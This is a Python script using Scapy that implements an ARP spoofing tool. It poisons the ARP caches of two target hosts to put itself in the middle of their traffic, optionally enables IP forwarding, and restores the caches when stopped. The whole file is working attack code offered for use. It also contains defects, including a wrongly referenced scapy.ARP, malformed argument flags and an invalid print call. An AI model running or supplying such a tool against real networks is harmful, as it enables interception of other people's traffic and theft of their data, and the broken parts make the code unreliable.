try:
    from logging import getLogger, ERROR
    getLogger('scapy.runtime').setLevel(ERROR)
    from scapy.all import *
    from scapy.all import srp, Ether, ARP
    conf.verb = 0
except ImportError:
    print ("[!] Failed to Import Scapy")
    sys.exit(1)


class PreAttack(object):
    def __init__(self, target, interface):
        self.target = target
        self.interface = interface
    def get_MAC_address(self):
        return srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=self.target),
        timeout=10, iface=self.interface) [0][0][1][ARP].hwsrc
    class change_IP_Forward(object):
        def __init__(self, path='/proc/sys/net/ipv4/ip_forward'):
            self.path = path 
        def enable_IP_Forward(self):
            with open(self.path, 'wb') as file:
                file.write(b'1')
            return 1
        def disable_IP_Forward(self):
            with open(self.path, 'wb') as file:
                file.write(b'0')
            return 0
class Attack(object):
    def __init__(self,targets,interface):
        self.target1 = targets[0]
        self.target2 = targets[1]
        self.interface = interface

    def send_Poison(self, MACs):
        
        send(scapy.ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst = MACs[0]),iface=self.interface) 
        send(scapy.ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst = MACs[1]),iface=self.interface)
    def send_Fix(self, MACs):
        send(scapy.ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst='ff:ff:ff:ff:ff:ff', hwsrc = MACs[0]), iface = self.interface)
        send(scapy.ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst='ff:ff:ff:ff:ff:ff', hwsrc = MACs[1]), iface = self.interface)


if __name__=='__main__':
    import sys
    import argparse
    from datetime import datetime
    from time import sleep as pause
    parser = argparse.ArgumentParser(description='ARP Spoofing tool')
    parser.add_argument('-i' '--interface', help='Network interface to attack on ', action='store', dest='interface', default=False)
    parser.add_argument('-t1' '--target1', help='First Target ', action='store', dest='target1', default=False)
    parser.add_argument('-t2' '--target2', help='Second Target', action='store', dest='target2', default=False)
    parser.add_argument('-f' '--forward', help='Auto-toggle IP forwarding', action='store_true', dest='forward', default=False)
    parser.add_argument('-q' '--quiet', help='Disable messages', action='store_true', dest='quiet', default=False)
    parser.add_argument('--time', help='Track attack time', action='store_true', dest='time', default=False)
    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    elif ((not args.target1)or (not args.target2)):
        parser.error('Invalid target')
        sys.exit(1)
    elif not args.interface:
        parser.error('No network interface given')
        sys.exit(1)

    
    start_Time= datetime.now()
    targets = [args.target1, args.target2]
    print('[*] Resolving Target Addresses...', sys.stdout.flush())
    
    try:
        MACs = list(map(lambda x: PreAttack(x,args.interface).get_MAC_address(), targets))
        print ('DONE')
    except Exception:
        print('FAİL \n[!] Failed to resolve Target Address')
        sys.exit(1)
    try: 
        if args.forward:
            print ('[*] Enabling IP Forwarding...', sys.stdout.flush())
            p = PreAttack.change_IP_Forward()
            p.enable_IP_Forward()
            print ('DONE')
    except IOError:
        print ('FAIL')
        try: 
            choice = input('[*] Proceed Attack ? [y/N').strip().lower()[0]
            if choice == 'y':
                pass
            elif choice == 'n':
                print('[*] User Cancelled Attack')
                sys.exit(1)
            else:
                print('[!] Invalid choice')
                sys.exit(1)
        except KeyboardInterrupt:
            sys.exit(1)
    

    while 1:
        try: 
            try: 
                attack = Attack(targets, args.interface)
                attack.send_Poison(MACs)
            except Exception:
                print ('[!] Failed to Send Poison')
                sys.exit(1)
            if not args.quiet:
                print (f'[*] Poison Sent to{targets[0]} and {targets[1]} ')
            else:
                pass
            pause(2.5)
        except KeyboardInterrupt:
            break
    print('[*] Fixing Targets...',sys.stdout.flush())
    for i in range(0,16):
        try:
            Attack(targets, args.interface).send_Fix(MACs) 
        except (Exception, KeyboardInterrupt):
            print['Fail']
            sys.exit(1)
        pause(2)
    print('DONE')
    try:
        if args.forward:
            print ('[*] Disabling IP Forwarding...', sys.stdout.flush())
            PreAttack.change_IP_Forward().disable_IP_Forward()
            print ('DONE')
    except IOError:
        print ('FAIL')
    if args.time:
        print (f'[*] Attack Time: {datetime.now()-start_Time}')
